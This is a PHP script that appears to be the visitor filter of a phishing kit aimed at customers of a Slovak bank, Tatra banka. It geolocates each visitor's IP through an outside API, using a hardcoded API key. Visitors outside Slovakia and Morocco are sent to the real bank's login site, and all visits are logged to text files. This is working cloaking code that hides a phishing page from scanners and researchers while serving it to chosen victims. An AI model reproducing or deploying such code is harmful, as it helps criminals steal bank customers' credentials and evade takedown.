<?php
error_reporting(0);
date_default_timezone_set('Europe/Bucharest');
$Sam1 =date("D,M,d,Y-g:ia");
$allowed = array('SK','MA');
$ip = $_SERVER['REMOTE_ADDR'];
function IP_TO_EARTH($ip){$_URL="https://iptoearth.expeditedaddons.com/?api_key=ECKW4U278N4YQLMZTG703P91BS9R52H068IOXJ5D6FA3V1&ip=$ip"; 
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_URL, $_URL);$content = curl_exec($ch);
$response=json_decode($content, true);
return $response;curl_close($ch);}
//-----------------------------------------------------------------
$response=IP_TO_EARTH($ip);
$response['country_code'];
$response['country'];
$country = $response['country'];
$countrycode = $response['country_code'];
//-----------------------------------------------
if(!in_array($countrycode, $allowed)){
$data = 'Blocked visit from : '.$country.' | Ip : '.$_SERVER['REMOTE_ADDR'].' | Visit on : '.$Sam1;
file_put_contents('./NO.txt', $data.PHP_EOL, FILE_APPEND);
header('Location: https://moja.tatrabanka.sk/');
exit();
}else {
$data = 'Visit from : '.$country.' | Ip : '.$_SERVER['REMOTE_ADDR'].' | Visit on : '.$Sam1;
file_put_contents('./YES.txt', $data.PHP_EOL, FILE_APPEND);
}
?>
